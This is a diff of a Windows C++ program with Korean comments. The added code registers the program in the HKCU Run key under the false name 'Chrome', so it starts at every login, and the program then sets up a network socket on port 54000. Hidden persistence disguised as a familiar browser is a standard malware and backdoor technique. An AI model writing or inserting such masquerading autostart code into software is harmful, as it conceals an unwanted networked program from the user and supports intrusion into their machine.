@@ -26,6 +26,23 @@ const int SERVER_PORT = 54000;
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
+    // 레지스터리에 저장. 컴퓨터 부팅 시 실행될 수 있도록
+    // 실행할 프로그램의 경로
+    TCHAR programPath[MAX_PATH];
+    GetModuleFileName(NULL, programPath, MAX_PATH);
+    const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    // 레지스트리에 등록
+    HKEY hKey;
+    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, regKeyPath, 0, KEY_SET_VALUE, &hKey);
+    if (result == ERROR_SUCCESS) {
+        result = RegSetValueEx(hKey, L"Chrome", 0, REG_SZ, (BYTE*)programPath, (DWORD)(lstrlen(programPath) + 1) * sizeof(TCHAR));
+        if (result == ERROR_SUCCESS) printf("Program added to startup\n");
+        else printf("Failed to add program to startup\n");
+        RegCloseKey(hKey);
+    }
+    else printf("Failed to open registry key\n");
+
     // 소켓 초기화
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
